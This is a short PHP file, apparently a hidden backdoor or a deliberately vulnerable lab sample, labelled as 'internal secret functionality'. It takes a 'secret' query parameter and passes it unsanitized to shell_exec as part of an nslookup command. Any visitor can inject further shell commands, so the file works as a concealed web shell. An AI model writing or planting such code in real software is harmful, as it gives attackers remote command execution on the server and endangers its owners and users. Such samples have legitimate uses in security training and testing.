<?php 
# Internal secret functionality
if(isset($_GET['secret'])){
    $secret = $_GET['secret'];
    shell_exec('nslookup ' . $secret);
}
?>
